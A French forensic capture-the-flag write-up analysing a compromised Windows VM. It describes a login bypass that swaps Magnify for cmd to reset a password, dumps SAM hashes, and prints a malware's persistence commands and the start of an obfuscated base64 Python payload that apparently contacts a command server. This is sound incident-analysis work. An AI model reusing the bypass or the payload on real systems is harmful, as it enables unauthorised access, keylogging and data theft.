
# Myles machine
La société ***Publicis Sapient Engineering*** propose un challenge de sécurité orienté forensic où une machine virtuelle nous est fournie.
[Vidéo d'explication](https://www.youtube.com/channel/UCDSbqKhAoWZARlWAPbf88rg)

Nos objectifs sont:
* Trouver/Contourner le mot de passe de session
* Trouver les comportements anormaux de la machine
* Déterminer l'historique et le contexte de cette machine

## Reconnaissance
### Ip de la machine
On démarre notre machine virtuelle et on lance un `netdiscover -r 192.168.1.0/24`
Une machine sort du lot car une nouvelle IP a été assignée dans le réseau local.  
Son IP : 192.168.1.16

```export BOX_IP=192.168.1.16```

### Nmap
On lance un nmap pour analyser notre machine depuis l'extérieur.
`nmap -A -T4 -Pn --script default,vuln -A -oN nmap-scan.txt $BOX_IP`\
Son nom : DESKTOP-8DK0CQ3

**Résultats** : Rien.\
Rien d'intéressant. Dommage! Adieu EternalBlue, SMBGhost, DéjaBlue..

## Découverte du mot de passe

> Pourquoi passer du temps à trouver un mot de passe alors qu'on peut le changer?

Pour cette partie, je décide de modifier le mot de passe en utilisant la technique du **"Repair Windows"**.
Je démarre ma VM avec un [nouveau disque .iso](https://www.microsoft.com/fr-fr/evalcenter/evaluate-windows-server-2019) de Windows Server 2019.

Au lieu d'installer ce nouveau système, je choisis de réparer le système actuel. Je sélectionne la bonne option pour choisir le système de fichier manuellement et dès que j'ai un explorateur de fichier, je me rends dans `D:\Windows\System32` et je remplace le programme `Magnify` par le programme `cmd`.
Le programme Magnify représente la loupe, utilitaire ergonomique qu'on peut lancer sur la page d'authentification.

Au redémarrage du système, on déclenche l'exécution de la loupe dans les options d'ergonomie (en bas à droite) et un terminal de commande s'ouvre en tant que `NT Authority System`.

On peut changer le mot de passe de l'utilisateur avec la commande `net user myles myles`
On peut désormais saisir le nouveau mot de passe ```myles``` et  TADAAAAAM ... on est dans la machine.

Tutorial : [Vidéo Youtube](https://www.youtube.com/watch?v=OKx0zwKDimg&ab_channel=ProcessusThief)

## Comportements anormaux
Après quelques clics par ci par là, on voit des documents qui pourraient sembler intéressants pour la suite de notre analyse. Le temps de tourner la tête pour me servir une bière, je vois plusieurs comportements anormaux :

 - [ ] Ouverture de la calculatrice sans action de l'utilisateur
 - [ ] Ouverture d'une page de ransomware qui me dit que mes fichiers sont maintenant chiffrés : **Oops, your files have been encrypted!** (WannaScream)
 - [ ] Ouverture de l'explorateur de fichiers sans action de l'utilisateur

Maintenant tout est clair : Myles s'est fait pirater.
Vite vite vite.. il reste 24h chrono!

## Mode forensic ON
### Fichiers intéressants
Avant de creuser le coeur du sujet, on peut prendre quelques minutes pour regarder autour de nous et analyser les quelques fichiers que possède Myles.

 - [ ] Des bases de données clients avec noms, prénoms, n° de carte bleue et emails
 - [ ] Des données d'entreprises Sirets, Emails, N° de téléphone
 - [ ] Des templates de documents divers

L'historique de téléchargement de Google Chrome nous montrera plus tard la provenance de ces fichiers. Les sites d'origine semblent sûrs.
A garder sous le coude.

Les fichiers ne semblent pas malveillants aux premiers abords (Pas d'alerte Windows Defender et VirusTotal.com confirme).
Et même pour les ".docx". :P

### Système
Myles a installé plusieurs navigateurs sur sa machine.
On les ouvre donc un par un et on s'aperçoit que Myles a visité plusieurs sites différents avec Google Chrome:

 - [ ] Téléchargement de Firefox, LibreOffice, WinRar, 7zip
 - [ ] Téléchargement de différents documents et fonds d'écran
 - [ ] Pornhub (Un petit coquin ce Myles!)
 - [ ] Des recherches pour résoudre des problèmes Windows (système lent, ouverture de la calculatrice automatique, ...) laissant penser que Myles a ressenti les premiers effets du piratage.

On peut faire un début d'hypothèse et imaginer que Myles a cliqué sur un lien malveillant depuis un site douteux mais il faut encore valider ça.

On analyse la base SAM :
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
myles:1001:aad3b435b51404eeaad3b435b51404ee:8261c987111cf830bdd496c37074f0a2:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:86a296cdb6732da098ee56bcb9fef078:::
```

On analyse les processus démarrés :
```
Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 0     0     [System Process]                                                          
 4     0     System                       x64   0                                      
 108   4     Registry                     x64   0                                      
 232   876   Calculator.exe               x64   1        DESKTOP-8DK0CQ3\myles         C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.2009.4.0_x64__8wekyb3d8bbwe\Calculator.exe
 372   4     smss.exe                     x64   0                                      
 468   648   dwm.exe                      x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 476   464   csrss.exe                    x64   0                                      
 552   464   wininit.exe                  x64   0                                      
 564   688   SecurityHealthService.exe    x64   0                                      
 572   544   csrss.exe                    x64   1                                      
 648   544   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 688   552   services.exe                 x64   0                                      
 716   552   lsass.exe                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 736   876   dllhost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\dllhost.exe
 832   688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 852   552   fontdrvhost.exe              x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 860   648   fontdrvhost.exe              x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 876   688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 968   688   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1020  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1068  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1132  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1140  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1152  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1176  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1232  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1336  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1344  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1388  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1456  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1496  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1608  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1636  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1644  688   VBoxService.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
 1672  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1768  688   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1836  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1848  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1860  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1900  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1952  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1972  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2008  4     Memory Compression           x64   0                                      
 2020  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2112  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2124  688   MsMpEng.exe                  x64   0                                      
 2144  876   SystemSettings.exe           x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\ImmersiveControlPanel\SystemSettings.exe
 2204  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2272  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2296  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2328  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2356  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2384  688   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2420  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 2432  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2440  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2484  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2572  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2720  688   spoolsv.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2752  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2792  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2840  688   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2852  876   ShellExperienceHost.exe      x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 2980  6868  conhost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\conhost.exe
 2992  688   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 3004  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3012  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3020  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3048  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3084  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3152  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3212  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3656  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 3664  688   svchost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\svchost.exe
 3716  4164  explorer.exe                 x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\explorer.exe
 3764  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3800  688   SearchIndexer.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 3804  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3828  3716  OneDrive.exe                 x86   1        DESKTOP-8DK0CQ3\myles         C:\Users\myles\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 3860  6220  Windows.WARP.JITService.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\Windows.WARP.JITService.exe
 3928  3716  VBoxTray.exe                 x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\VBoxTray.exe
 3932  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3952  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3968  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4120  876   WinStore.App.exe             x64   1        DESKTOP-8DK0CQ3\myles         C:\Program Files\WindowsApps\Microsoft.WindowsStore_12010.1001.3.0_x64__8wekyb3d8bbwe\WinStore.App.exe
 4124  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 4148  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4160  876   Microsoft.Photos.exe         x64   1        DESKTOP-8DK0CQ3\myles         C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2020.20090.1002.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe
 4540  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4680  1336  sihost.exe                   x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\sihost.exe
 4708  688   svchost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\svchost.exe
 4748  688   svchost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\svchost.exe
 4844  1176  taskhostw.exe                x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\taskhostw.exe
 4944  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4992  4944  ctfmon.exe                   x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\ctfmon.exe
 5064  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 5232  876   StartMenuExperienceHost.exe  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
 5256  688   SgrmBroker.exe               x64   0                                      
 5364  876   MoUsoCoreWorker.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\MoUsoCoreWorker.exe
 5484  688   svchost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\svchost.exe
 5524  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 5656  876   SearchApp.exe                x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
 5728  876   MicrosoftEdgeCP.exe          x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\MicrosoftEdgeCP.exe
 5832  876   dllhost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\dllhost.exe
 5840  3800  SearchProtocolHost.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchProtocolHost.exe
 5916  6348  MicrosoftEdgeSH.exe          x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\MicrosoftEdgeSH.exe
 5988  7056  jBUxGLhUJteK.exe             x86   1        DESKTOP-8DK0CQ3\myles         C:\Users\myles\AppData\Local\Temp\jBUxGLhUJteK.exe
 6004  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 6108  876   ApplicationFrameHost.exe     x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\ApplicationFrameHost.exe
 6132  876   YourPhone.exe                x64   1        DESKTOP-8DK0CQ3\myles         C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20101.97.0_x64__8wekyb3d8bbwe\YourPhone.exe
 6220  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 6232  688   svchost.exe                  x64   0                                      
 6348  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 6724  876   TextInputHost.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe
 6868  7056  cmd.exe                      x86   1        DESKTOP-8DK0CQ3\myles         C:\Windows\SysWOW64\cmd.exe
 6888  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 7044  3800  SearchFilterHost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchFilterHost.exe
 7140  3716  SecurityHealthSystray.exe    x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\SecurityHealthSystray.exe
 7160  876   UserOOBEBroker.exe           x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\oobe\UserOOBEBroker.exe
 7224  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
 7312  688   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 7324  688   svchost.exe                  x64   0                                      
 7420  688   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 7464  876   browser_broker.exe           x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\browser_broker.exe
 7556  7300  powershell.exe               x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 7564  7320  powershell.exe               x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 7572  7564  conhost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\conhost.exe
 7580  7556  conhost.exe                  x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\conhost.exe
 7824  7556  powershell.exe               x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 7840  7564  powershell.exe               x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 7992  7824  vlc_updater.exe              x64   1        DESKTOP-8DK0CQ3\myles         C:\WinCache\vlc_updater.exe
 8008  7840  vlc_updater.exe              x64   1        DESKTOP-8DK0CQ3\myles         C:\WinCache\vlc_updater.exe
 8032  7992  vlc_updater.exe              x64   1        DESKTOP-8DK0CQ3\myles         C:\WinCache\vlc_updater.exe
 8040  8008  vlc_updater.exe              x64   1        DESKTOP-8DK0CQ3\myles         C:\WinCache\vlc_updater.exe
 8200  6220  Windows.WARP.JITService.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\Windows.WARP.JITService.exe
 8392  876   MicrosoftEdge.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe
 9136  876   RuntimeBroker.exe            x64   1        DESKTOP-8DK0CQ3\myles         C:\Windows\System32\RuntimeBroker.exe
```

Les premiers processus ne montrent rien d'évident.
Bien qu'on remarque 4 processus `vlc_updater.exe` simultanés.  Weird..
Quand la calculatrice s'ouvre, le processus `Calculator.exe` est présent mais on ne peut rien en tirer.
Quand le ransomware lance sa page crypt.html, le processus `MicrosoftEdge.exe` est présent mais là non plus, difficile d'aller plus loin.

Ces 2 processus ont comme parent le processus 876 --> svchost.exe

> Selon Microsoft, svchost.exe est un processus générique (generic host process ) pour les services exécutés à partir de bibliothèques dynamiques.

Repartons à partir de ce qui semble bizarre : Le process `vlc_updater.exe`.

On recherche ce fichier dans l'arborescence de notre machine.
```
C:\>dir /b/s vlc_updater.exe
C:\WinCache\vlc_updater.exe
```
Le dossier `WinCache` n'est pas un dossier commun dans une installation Windows 10 par défaut.

```
C:\WinCache>dir

Directory of C:\WinCache

10/09/2020  05:38 AM    <DIR>          argparse-1.4.0.dist-info
10/09/2020  05:38 AM            89,214 argparse.py
10/09/2020  05:38 AM    <DIR>          bin
10/09/2020  05:38 AM    <DIR>          certifi
10/09/2020  05:38 AM    <DIR>          certifi-2020.6.20.dist-info
10/09/2020  05:38 AM    <DIR>          chardet
10/09/2020  05:38 AM    <DIR>          chardet-3.0.4.dist-info
10/09/2020  05:38 AM    <DIR>          Crypto
10/09/2020  05:38 AM    <DIR>          easyprocess
10/09/2020  05:38 AM    <DIR>          EasyProcess-0.3.dist-info
10/09/2020  05:38 AM    <DIR>          entrypoint2
10/09/2020  05:38 AM    <DIR>          entrypoint2-0.2.3.dist-info
10/09/2020  05:38 AM    <DIR>          idna
10/09/2020  05:38 AM    <DIR>          idna-2.10.dist-info
10/09/2020  05:38 AM    <DIR>          keyboard
10/09/2020  05:38 AM    <DIR>          keyboard-0.13.5.dist-info
10/09/2020  05:38 AM    <DIR>          mss
10/09/2020  05:38 AM    <DIR>          mss-6.0.0.dist-info
10/09/2020  05:38 AM    <DIR>          PIL
10/09/2020  05:38 AM    <DIR>          Pillow-7.2.0.dist-info
10/09/2020  05:38 AM    <DIR>          pycryptodome-3.9.8.dist-info
10/09/2020  05:38 AM    <DIR>          pyscreenshot
10/09/2020  05:38 AM    <DIR>          pyscreenshot-2.2.dist-info
10/09/2020  05:38 AM    <DIR>          requests
10/09/2020  05:38 AM    <DIR>          requests-2.24.0.dist-info
10/09/2020  05:40 AM            97,170 sanic.gif
11/25/2020  05:34 AM                96 stage1.ps1
11/25/2020  05:35 AM            16,614 stage1.py
11/25/2020  05:46 AM             1,644 stage2.py
11/25/2020  05:46 AM                99 task.ps1
10/09/2020  05:38 AM    <DIR>          urllib3
10/09/2020  05:38 AM    <DIR>          urllib3-1.25.10.dist-info
10/09/2020  05:37 AM        16,269,935 vlc_updater.exe
10/09/2020  05:38 AM    <DIR>          websockets
10/09/2020  05:38 AM    <DIR>          websockets-8.1.dist-info
10/09/2020  05:38 AM    <DIR>          __pycache__
               7 File(s)     16,474,772 bytes
              29 Dir(s)  18,170,699,776 bytes free

```

WOW! A première vue, quelques fichiers semblent douteux et donc intéressants :  `stage1.ps1`, `stage1.py`, `stage2.py` et `task.ps1`.  
On voit d'autres fichiers relatifs au langage python et à ses modules de traitement d'images (PIL, pyscreenshot), de cryptographie (Crypto), de communication Web (websockets, urllib3, requests), de gestion du clavier (keyboard), ...

C'est à coup sûr très bizarre!  

On récupère les fichiers sur notre machine et on les analyse au calme.

```
cat task.ps1
schtasks /create /F /IT /tn WinCache /tr "powershell C:\WinCache\stage1.ps1" /sc onlogon /ru System
```
C'est une commande de création de tâche système qui sera jouée à l'authentification de l'utilisateur lorsqu'il démarrera sa session. Le fichier `C:\WinCache\stage1.ps1` sera exécuté.

```
cat stage1.ps1
powershell.exe -windowstyle hidden -c "type C:\WinCache\stage1.py | C:\WinCache\vlc_updater.exe"
```
Cette commande vient écrire le contenu de `C:\WinCache\stage1.py` comme entrée standard du programme  `C:\WinCache\vlc_updater.exe`.  \
On peut conclure que le fichier `C:\WinCache\vlc_updater.exe` n'est autre que plus ou mois un interpréteur python.
Voyons ça :

```
C:\Windows\system32>C:\WinCache\vlc_updater.exe
Python 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 23:09:28) [MSC v.1916 64 bit (AMD64)]
Type "help", "copyright", "credits" or "license" for more information.
>>>
```
Après un petit test, on confirme que c'est bien ça.

```
cat stage1.py

import base64
import codecs
exec(codecs.encode(base64.b64decode('IyEvaGZlL292YS9yYWkgY2xndWJhMwp2emNiZWcgZmJweHJnCnZ6Y2JlZyBiZgp2emNiZWcgcGdsY3JmICN1Z2djZjovL2pqai5xYmx5cmUuYXJnL2ZycGhldmdsLWFiZy12YXB5aHFycS9ya3JwaGd2YXQtZnVyeXlwYnFyLWp2Z3UtY2xndWJhCnZ6Y2JlZyBlcmRocmZnZgp2emNiZWcgbXZjc3Z5cgp2emNiZWcgZ3J6Y3N2eXIKdnpjYmVnIG9uZnI2NAp2emNiZWcgd2ZiYQp2emNiZWcganJvZmJweHJnZgp2emNiZWcgbmZsYXB2Ygp2emNiZWcgZmxmCnZ6Y2JlZyBndnpyCnZ6Y2JlZyBwYnFycGYKdnpjYmVnIGNsZnBlcnJhZnViZyBuZiBWem50clRlbm8KdnpjYmVnIHhybG9ibmVxCnNlYnogZW5hcWJ6IHZ6Y2JlZyBlbmFxZW5hdHIKc2VieiBQZWxjZ2IuUHZjdXJlIHZ6Y2JlZyBOUkYKc2VieiBQZWxjZ2IuSGd2eS5DbnFxdmF0IHZ6Y2JlZyBjbnEKc2VieiBQZWxjZ2IuSGd2eS5DbnFxdmF0IHZ6Y2JlZyBoYWNucQoKUDI9cGJxcnBmLnJhcGJxcignaHR0cDovL21pY3Jvc29mdG9ubGluZS5kb3dubG9hZCcsICdlYmctMTMnKQpUVlNfU1ZZUj1wYnFycGYucmFwYnFyKCdDOlxcV2luQ2FjaGVcXHNhbmljLmdpZicsICdlYmctMTMnKQpYUkw9cGJxcnBmLnJhcGJxcignSEtFWV9VU0VSU1xcYWRtaW4nLCAnZWJnLTEzJykucmFwYnFyKHBicXJwZi5yYXBicXIoJ3V0Zi04JywgJ2ViZy0xMycpKQpWST1wYnFycGYucmFwYnFyKCdDOlxcVXNlcnNcXGFkbWluXFwkJywgJ2ViZy0xMycpLnJhcGJxcihwYnFycGYucmFwYnFyKCd1dGYtOCcsICdlYmctMTMnKSkKSkZfSEVZPXBicXJwZi5yYXBicXIoJ3dzOi8vbWljcm9zb2Z0b25saW5lLmRvd25sb2FkL3dpbmRvd3N1cGRhdGVzLycsICdlYmctMTMnKQpIVlEgPSBBYmFyCgpPSFNTUkVfRlZNUiA9IDgxOTIKCm5yZiA9IE5SRi5hcmooWFJMLCBOUkYuWkJRUl9SUE8pCk9ZQlBYX0ZWTVIgPSAxNgoKam52Z3ZhdCA9IFNueWZyCmVoYWF2YXQgPSBHZWhyCkZZUlJDX0dWWlIgPSA4ClhSTFlCVF9TVllSPXBicXJwZi5yYXBicXIoJ2tleXMubG9nJywgJ2ViZy0xMycpClhSTFlCVF9DTkdVPSIvZ3pjLyIgKyBYUkxZQlRfU1ZZUgp2cyBiZi5hbnpyID09ICdhZyc6CiAgICBYUkxZQlRfQ05HVSA9IGJmLnRyZ3JhaShwYnFycGYucmFwYnFyKCdBUFBEQVRBJywgJ2ViZy0xMycpKStwYnFycGYucmFwYnFyKCdcXC4uXFxMb2NhbFxcJywgJ2ViZy0xMycpK1hSTFlCVF9TVllSCgpRUk9IVCA9IFNueWZyCgpxcnMgY2JqcmVmZ3JueWd1KHB6cSk6CiAgICBnZWw6CiAgICAgICAgdnMgUVJPSFQ6CiAgICAgICAgICAgIGJmLmZsZmdyeigiY2JqcmVmdXJ5eS5ya3IgLXAgXCIlZlwiIiAlcHpxKQogICAgICAgIHJ5ZnI6CiAgICAgICAgICAgIGJmLmZsZmdyeigiY2JqcmVmdXJ5eS5ya3IgLWp2YXFiamZnbHlyIHV2cXFyYSAtcCBcIiVmXCIiICVwenEpCiAgICBya3ByY2cgUmtwcmNndmJhIG5mIHI6CiAgICAgICAgdnMgUVJPSFQ6CiAgICAgICAgICAgIGNldmFnKHIpCiAgICAgICAgICAgIApxcnMgcnlyaW5ncigpOgogICAgdmZOcXp2YSA9IFNueWZyCiAgICBnZWw6CiAgICAgICAgdmZOcXp2YSA9IHBnbGNyZi5qdmFxeXkuZnVyeXkzMi5WZkhmcmVOYU5xenZhKCkKICAgICAgICBmZ250cjFfY2YxID0gcGJxcnBmLnJhcGJxcigncG93ZXJzaGVsbC5leGUgLXdpbmRvd3N0eWxlIGhpZGRlbiAtYyAidHlwZSBDOlxcV2luQ2FjaGVcXHN0YWdlMS5weSB8IEM6XFxXaW5DYWNoZVxcdmxjX3VwZGF0ZXIuZXhlIicsICdlYmctMTMnKQogICAgICAgIHZzIGFiZyBiZi5jbmd1LnZmc3Z5cihwYnFycGYucmFwYnFyKCdDOlxcV2luQ2FjaGVcXHN0YWdlMS5wczEnLCAnZWJnLTEzJykpOgogICAgICAgICAgICBqdmd1IGJjcmEocGJxcnBmLnJhcGJxcignQzpcXFdpbkNhY2hlXFxzdGFnZTEucHMxJywgJ2ViZy0xMycpLCAiaisiKSBuZiBzOgogICAgICAgICAgICAgICAgcy5qZXZncihmZ250cjFfY2YxKQogICAgcmtwcmNnIFJrcHJjZ3ZiYSBuZiByOgogICAgICAgIHZzIFFST0hUOgogICAgICAgICAgICBjZXZhZyhyKQogICAgICAgIGNuZmYKICAgIHZzIGFiZyB2Zk5xenZhIG5hcSBiZi5hbnpyID09ICdhZyc6CiAgICAgICAgdnMgUVJPSFQ6CiAgICAgICAgICAgIGNldmFnKHBicXJwZi5yYXBicXIoJ1VzZXIgaXMgbm90IGFkbWluJywgJ2ViZy0xMycpKQogICAgICAgIHZzIHBnbGNyZi5qdmFxeXkuZnVyeXkzMi5GdXJ